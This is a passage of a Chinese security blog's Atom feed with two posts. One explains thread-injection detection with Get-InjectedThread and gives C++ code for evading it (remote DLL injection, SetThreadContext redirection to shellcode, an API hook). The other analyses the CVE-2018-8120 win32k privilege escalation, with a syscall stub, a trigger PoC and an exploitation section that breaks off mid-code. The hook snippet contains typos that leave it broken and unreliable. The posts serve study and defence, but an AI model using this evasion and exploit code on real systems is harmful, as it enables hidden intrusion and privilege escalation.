<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HaCky的安全备忘录</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findream.github.io/"/>
  <updated>2023-02-20T13:40:37.606Z</updated>
  <id>https://findream.github.io/</id>
  
  <author>
    <name>HaCky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>detect threat inject —— 以Get-InjectedThread为例</title>
    <link href="https://findream.github.io/2023/02/20/detect%20thread%20Inject%E2%80%94%E2%80%94%E4%BB%A5Get-InjectedThread%E4%B8%BA%E4%BE%8B/"/>
    <id>https://findream.github.io/2023/02/20/detect thread Inject——以Get-InjectedThread为例/</id>
    <published>2023-02-20T12:45:11.000Z</published>
    <updated>2023-02-20T13:40:37.606Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法<a id="more"></a></li></ul><h2 id="0x01-线程注入检测原理"><a href="#0x01-线程注入检测原理" class="headerlink" title="0x01 线程注入检测原理"></a>0x01 线程注入检测原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2" target="_blank" rel="external">Get-InjectedThread</a>是由Joe Desimone和Jared Atkinson发布的powershell 线程注入检测脚本。通过检测线程的的状态和类型，如果内存类型不为<code>MEM_IMAGE</code>,则说明存在注入。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get-InjectedThread的具体检测逻辑是这样的:</p><ul><li>1) 通过<code>CreateToolhelpSnapshot</code>,<code>Thread32First</code>,<code>Thread32Next</code>遍历所有的线程</li><li>2）调用<code>OpenThread</code>获取目标线程的线程句柄</li><li>3）调用<code>NtQueryInformationThread</code>,将ThreadInformationClass参数指定为ThreadQuerySetWin32StartAddress，获取线程内存的起始地址Thread Start Address</li><li>4）调用<code>OpenProcess</code>获取线程对应进程的句柄</li><li>5）将<code>Process Handle</code>和<code>Thread Start Address</code>传递给<code>VirtualQueryEx</code>，获取<code>MEMORY_BASIC_INFORMATION</code>。</li><li>6) 检查<code>MEMORY_BASIC_INFORMATION</code>结构体中状态字段(<code>State</code>)和类型字段(<code>Type</code>),如果内存类型不为<code>MEM_IMAGE</code>,状态是<code>MEM_COMMIT</code>,则说明存在注入。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据elastic的John Uhlmann在2022年11月的<a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">Get-InjectedThreadEx – Detecting Thread Creation Trampolines一文</a>，已经增加了启发式的方法来检测线程注入。即通过检测线程入口的关键字。</p><ul><li>1）MZ关键字</li><li>2）一些返回，跳转或者无意义填充的字节</li></ul><h2 id="0x02-绕过策略"><a href="#0x02-绕过策略" class="headerlink" title="0x02 绕过策略"></a>0x02 绕过策略</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;John Uhlmann在他的<a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">文章</a>描述了几种绕过Get-InjectedThread的方法，但是这些方法都被他修复了。同样的XPN也在2018年针对早期版本的Get-InjectedThread进行了绕过。</p><h3 id="利用Dll规避内存类型和状态检测"><a href="#利用Dll规避内存类型和状态检测" class="headerlink" title="利用Dll规避内存类型和状态检测"></a>利用Dll规避内存类型和状态检测</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将shellcode包装到dll模块中，然后通过<code>CreateRemoteThread</code>远程线程注入的方式执行，因为线程入口点是<code>LoadLibrary</code>,因此绕过Get-InjectedThread。流程如下：</p><ul><li>1）获取调用地址LoadLibraryA。</li><li>2）在我们的目标进程中分配内存。</li><li>3）将我们的 DLL 的路径写入分配的内存中。</li><li>4）调用以启动新线程，入口点为LoadLibraryA，将DLL路径内存地址作为参数传递。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">example_loadlibrary</span><span class="params">(<span class="keyword">int</span> pid)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> currentDir[MAX_PATH];</div><div class="line">SIZE_T bytesWritten = <span class="number">0</span>;</div><div class="line">HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, pid);</div><div class="line"><span class="keyword">if</span> (processHandle == INVALID_HANDLE_VALUE) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not open process with PID %d\n"</span>, pid);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *alloc = VirtualAllocEx(processHandle, <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</div><div class="line"><span class="keyword">if</span> (alloc == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not allocate memory in process\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *_loadLibrary = GetProcAddress(LoadLibraryA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</div><div class="line"><span class="keyword">if</span> (_loadLibrary == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not find address of LoadLibrary\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">GetCurrentDirectoryA(MAX_PATH, currentDir);</div><div class="line">strncat_s(currentDir, <span class="string">"\\injectme.dll"</span>, MAX_PATH);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Injecting path to load DLL: %s\n"</span>, currentDir);</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(processHandle, alloc, currentDir, <span class="built_in">strlen</span>(currentDir) + <span class="number">1</span>, &amp;bytesWritten)) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not write into process memory\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Written %d bytes\n"</span>, bytesWritten);</div><div class="line"><span class="keyword">if</span> (CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)_loadLibrary, alloc, <span class="number">0</span>, <span class="literal">NULL</span>) == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="SetThreadContext线程注入"><a href="#SetThreadContext线程注入" class="headerlink" title="SetThreadContext线程注入"></a>SetThreadContext线程注入</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，拉起一个挂起的线程，该线程的入口点内存类型为<code>MEM_IMAGE</code>,通过<code>SetThreadContext</code>方法，将线程的入口点设置为Shellcode。在线程被拉起的时候，内存类型为<code>MEM_IMAGE</code>,由此绕过检测。</p><ul><li>1)在目标进程中分配内存来保存我们的 shellcode。</li><li>2)将我们的 shellcode 复制到分配的内存中。</li><li>3)产生一个挂起的线程，将 ThreadProc 设置为任何MEM_IMAGE标记的内存区域。</li><li>4)检索挂起线程的当前寄存器。</li><li>5)更新 RIP 寄存器以指向驻留在已分配内存中的 shellcode。</li><li>6)恢复执行。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[<span class="number">256</span>] = &#123;</div><div class="line"><span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></div><div class="line">&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">example_switchsuspend</span><span class="params">(<span class="keyword">int</span> pid)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> currentDir[MAX_PATH];</div><div class="line">SIZE_T bytesWritten = <span class="number">0</span>;</div><div class="line">HANDLE threadHandle;</div><div class="line">HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, pid);</div><div class="line"><span class="keyword">if</span> (processHandle == INVALID_HANDLE_VALUE) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not open process with PID %d\n"</span>, pid);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *alloc = VirtualAllocEx(processHandle, <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</div><div class="line"><span class="keyword">if</span> (alloc == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not allocate memory in process\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *_loadLibrary = GetProcAddress(LoadLibraryA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</div><div class="line"><span class="keyword">if</span> (_loadLibrary == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not find address of LoadLibrary\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">*(DWORD64 *)(shellcode + <span class="number">26</span>) = (DWORD64)GetProcAddress(LoadLibraryA(<span class="string">"user32.dll"</span>), <span class="string">"MessageBoxA"</span>);</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(processHandle, alloc, shellcode, <span class="keyword">sizeof</span>(shellcode), &amp;bytesWritten)) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not write to process memory\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Written %d bytes to %p\n"</span>, bytesWritten, alloc);</div><div class="line">threadHandle = CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)_loadLibrary, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (threadHandle == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// Get the current registers set for our thread</span></div><div class="line">CONTEXT ctx;</div><div class="line">ZeroMemory(&amp;ctx, <span class="keyword">sizeof</span>(CONTEXT));</div><div class="line">ctx.ContextFlags = CONTEXT_CONTROL;</div><div class="line">GetThreadContext(threadHandle, &amp;ctx);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] RIP register set to %p\n"</span>, ctx.Rip);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Updating RIP to point to our shellcode\n"</span>);</div><div class="line">ctx.Rip = (DWORD64)alloc;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Resuming thread execution at our shellcode address\n"</span>);</div><div class="line">SetThreadContext(threadHandle, &amp;ctx);</div><div class="line">ResumeThread(threadHandle);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="Hook-API函数"><a href="#Hook-API函数" class="headerlink" title="Hook API函数"></a>Hook API函数</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个方法就是Hook一个API函数，因为API函数本身内存类型和状态就可以绕过Get-InjectedThread工具。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">char hook[] = &#123;<span class="number">0x48</span>，<span class="number">0xb8</span>，<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>,<span class="number">0x44</span>,<span class="number">0x55</span>,<span class="number">0x66</span>,<span class="number">0x77</span>,<span class="number">0x88</span>,<span class="number">0xff</span>，<span class="number">0xe0</span>&#125;;</div><div class="line">*(ULONG_PTR*)(hook + <span class="number">2</span>) = (ULONG PTR)pShellcode;</div><div class="line">auto pHookedFunc = GetProcAddress(GetModuleHandlew(L<span class="string">"ntd11.d11"</span>), <span class="string">"DbgUiRemoteBreakin"</span>);</div><div class="line">WriteProcessMemory(GetCurrentProcess()，pHookedFunc, hook, sizeof(hook)， NULL);</div><div class="line">CreateThread(NULL，<span class="number">0</span>，(LPTHREAD START ROUTINE)pHookedFunc，NULL，<span class="number">0</span>，NULL);</div></pre></td></tr></table></figure></p><h2 id="0x00-参考文章"><a href="#0x00-参考文章" class="headerlink" title="0x00 参考文章"></a>0x00 参考文章</h2><ul><li><p><a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2" target="_blank" rel="external">Get-InjectedThread powershell源码</a></p></li><li><p><a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">Get-InjectedThreadEx – Detecting Thread Creation Trampolines</a></p></li><li><p><a href="https://posts.specterops.io/defenders-think-in-graphs-too-part-1-572524c71e91" target="_blank" rel="external">Defenders Think in Graphs Too! Part 1</a></p></li><li><p><a href="https://github.com/jdu2600/Get-InjectedThreadEx/blob/main/Get-InjectedThreadEx.ps1" target="_blank" rel="external">升级后的Get-InjectedThreadEx</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法
    
    </summary>
    
      <category term="红蓝对抗" scheme="https://findream.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-8120 内核提权漏洞分析</title>
    <link href="https://findream.github.io/2023/02/08/CVE-2018-8120%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2023/02/08/CVE-2018-8120内核提权漏洞分析/</id>
    <published>2023-02-08T12:45:11.000Z</published>
    <updated>2023-02-09T05:16:37.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-漏洞描述"><a href="#0x1-漏洞描述" class="headerlink" title="0x1 漏洞描述"></a>0x1 漏洞描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的<code>SetImeInfoEx</code>函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对<code>tagWINDOWSTATION</code>结构的<code>spklList</code>成员做有效性验证，就对其进行解引用，如果<code>spklList</code>为NUll的话，继而对其进行解引用，导致漏洞触发。<br><a id="more"></a></p><h2 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>SetImeInfoEx</code>的反汇编结果，可知<code>pklFirst = pwinsta-&gt;spklList;</code>，在取出tagWINDOWSTATION结构体的<code>spklList</code>的成员之后，并没有对<code>pklFirst</code>进行有效性验证，便对<code>pklFirst</code>进行解引用操作,<code>while ( pklFirst-&gt;hkl != piiex-&gt;hkl)</code>,假设<code>pklFirst</code>为NULL，便导致任意地址覆盖漏洞。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __stdcall SetImeInfoEx(tagWINDOWSTATION *pwinsta, tagIMEINFOEX *piiex)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  tagKL *pklFirst; <span class="comment">// eax</span></div><div class="line">  tagIMEINFOEX *v4; <span class="comment">// eax</span></div><div class="line">  result = pwinsta;</div><div class="line">  <span class="keyword">if</span> ( pwinsta )</div><div class="line">  &#123;</div><div class="line">    pklFirst = pwinsta-&gt;spklList;               <span class="comment">// 没有对pklFirst 的合法性进行验证</span></div><div class="line">    <span class="keyword">while</span> ( pklFirst-&gt;hkl != piiex-&gt;hkl )       <span class="comment">// 如果pklFirst为NULL的话，对pklFirst进行解引用。会导致失败</span></div><div class="line">    &#123;</div><div class="line">      pklFirst = pklFirst-&gt;pklNext;</div><div class="line">      <span class="keyword">if</span> ( pklFirst == pwinsta-&gt;spklList )</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    v4 = pklFirst-&gt;piiex;</div><div class="line">    <span class="keyword">if</span> ( !v4 )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> ( !v4-&gt;fLoadFlag )</div><div class="line">      qmemcpy(v4, piiex, sizeof(tagIMEINFOEX));</div><div class="line">    result = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;换言之，我们只需要进行构造一个<code>tagWINDOWSTATION</code>,使得tagWINDOWSTATION+0x14偏移的<code>spklList</code>成员为NULL，然后在对<code>spklList</code>进行解引用时。继而程序崩溃，导致任意地址覆盖漏洞。<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">2</span>: kd&gt; dt win32k!tagWINDOWSTATION</div><div class="line">   +<span class="number">0</span>x000 <span class="attribute">dwSessionId      </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x004 <span class="attribute">rpwinstaNext     </span>: Ptr32 tagWINDOWSTATION</div><div class="line">   +<span class="number">0</span>x008 <span class="attribute">rpdeskList       </span>: Ptr32 tagDESKTOP</div><div class="line">   +<span class="number">0</span>x00c <span class="attribute">pTerm            </span>: Ptr32 tagTERMINAL</div><div class="line">   +<span class="number">0</span>x010 <span class="attribute">dwWSF_Flags      </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x014 <span class="attribute">spklList         </span>: Ptr32 tagKL</div><div class="line">   +<span class="number">0</span>x018 <span class="attribute">ptiClipLock      </span>: Ptr32 tagTHREADINFO</div><div class="line">   +<span class="number">0</span>x01c <span class="attribute">ptiDrawingClipboard </span>: Ptr32 tagTHREADINFO</div><div class="line">   +<span class="number">0</span>x020 <span class="attribute">spwndClipOpen    </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x024 <span class="attribute">spwndClipViewer  </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x028 <span class="attribute">spwndClipOwner   </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x02c <span class="attribute">pClipBase        </span>: Ptr32 tagCLIP</div><div class="line">   +<span class="number">0</span>x030 <span class="attribute">cNumClipFormats  </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x034 <span class="attribute">iClipSerialNumber </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x038 <span class="attribute">iClipSequenceNumber </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x03c <span class="attribute">spwndClipboardListener </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x040 <span class="attribute">pGlobalAtomTable </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x044 <span class="attribute">luidEndSession   </span>: _LUID</div><div class="line">   +<span class="number">0</span>x04c <span class="attribute">luidUser         </span>: _LUID</div><div class="line">   +<span class="number">0</span>x054 <span class="attribute">psidUser         </span>: Ptr32 Void</div></pre></td></tr></table></figure></p><h2 id="0x3-漏洞验证"><a href="#0x3-漏洞验证" class="headerlink" title="0x3 漏洞验证"></a>0x3 漏洞验证</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对SetImeInfoEx进行交叉引用，发现是由<code>NtUserSetImeInfoEx</code>函数调用，首先，将传入的参数tagIMEINFOEX复制到piiex，然后创建一个WindowsStation，并将这两个作为参数传入SetImeInfoEx。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">int __stdcall NtUserSetImeInfoEx(tagIMEINFOEX *<span class="built_in">a1</span>)</div><div class="line">&#123;</div><div class="line">  int <span class="built_in">v1</span><span class="comment">; // esi</span></div><div class="line">  tagWINDOWSTATION *v2<span class="comment">; // eax</span></div><div class="line">  tagIMEINFOEX piiex<span class="comment">; // [esp+10h] [ebp-178h] BYREF</span></div><div class="line">  CPPEH_RECORD ms_exc<span class="comment">; // [esp+170h] [ebp-18h]</span></div><div class="line">  UserEnterUserCritSec()<span class="comment">;</span></div><div class="line">  if ( (*gpsi &amp; <span class="number">4</span>) != <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    qmemcpy(&amp;piiex, <span class="built_in">a1</span>, sizeof(piiex))<span class="comment">;</span></div><div class="line">    ms_exc.registration.TryLevel = -<span class="number">2</span><span class="comment">;</span></div><div class="line">    v2 = _GetProcessWindowStation(<span class="number">0</span>)<span class="comment">;</span></div><div class="line">    <span class="built_in">v1</span> = SetImeInfoEx(v2, &amp;piiex)<span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    UserSetLastError(<span class="number">120</span>)<span class="comment">;</span></div><div class="line">    <span class="built_in">v1</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">  UserSessionSwitchLeaveCrit()<span class="comment">;</span></div><div class="line">  return <span class="built_in">v1</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于<code>NtUserSetImeInfoEx</code>函数并没有导出，只能通过系统调用的方式进行调用。首先将参数放到esi寄存器中，将调用号放到eax寄存机中，系统调用号可以利用PCHunter，在内核钩子–SSDT中，找到NtUserSetImeInfoEx的编号为550，也就是226，然后加上0x1000的偏移，就是0x1226.<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">BOOL __declspec(naked) CallNtUserSetImeInfoEx(PVOID arg0)</div><div class="line">&#123;</div><div class="line">    __asm</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, arg0</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x1226</span>           // NtUserSetImeInfoEx的调用号</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0x7FFE0300</span></div><div class="line">        <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span>[<span class="built_in">edx</span>]</div><div class="line">        <span class="keyword">ret</span> <span class="number">4</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>NtUserSetImeInfoEx</code>函数和<code>SetImeInfoEx</code>的伪代码，函数验证需要两个基本条件，第一，根据传入<code>SetImeInfoEx</code>参数为<code>tagWINDOWSTATION</code>，需要使用<code>CreateWindowStation</code>函数创建一个WindowStation结构。第二，根据<code>v2 = _GetProcessWindowStation(0);</code>可以知道，需要将创建的WindowStation设置为当前进程的。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> POC_CVE_2018_8120()</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> bRet = <span class="literal">TRUE</span>;</div><div class="line">HWINSTA hSta = <span class="literal">NULL</span>;</div><div class="line"><span class="comment">// 创建tagWINDOWSTATION结构体</span></div><div class="line">hSta = CreateWindowStation(<span class="literal">NULL</span>, <span class="number">0</span>, READ_CONTROL, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (hSta == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"CreateWindowStation"</span>, GetLastError());</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 将创建的结构体设置到本进程中</span></div><div class="line"><span class="keyword">if</span> (!SetProcessWindowStation(hSta))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"SetProcessWindowStation"</span>, GetLastError());</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="keyword">char</span> szBuf[<span class="number">0x15C</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">CallNtUserSetImeInfoEx((PVOID)szBuf);</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x4-漏洞利用"><a href="#0x4-漏洞利用" class="headerlink" title="0x4 漏洞利用"></a>0x4 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据任意地址覆盖漏洞常规的利用方法，将ShellCode地址复制到HalQuerySystemInformation地址上，然后调用<code>NtQueryIntervalProfile</code>执行即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们开辟零页内存和获取HalQuerySystemInformation地址，开辟零页内存是为了后续能够有空间存放HalQuerySystemInformation地址和Shellcode，不至于在触发漏洞的时候崩溃。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 0地址分配内存</span></div><div class="line"><span class="keyword">if</span> (!AllocateZeroMemory())</div><div class="line">&#123;</div><div class="line">bRet = FALSE;</div><div class="line"><span class="keyword">return</span> 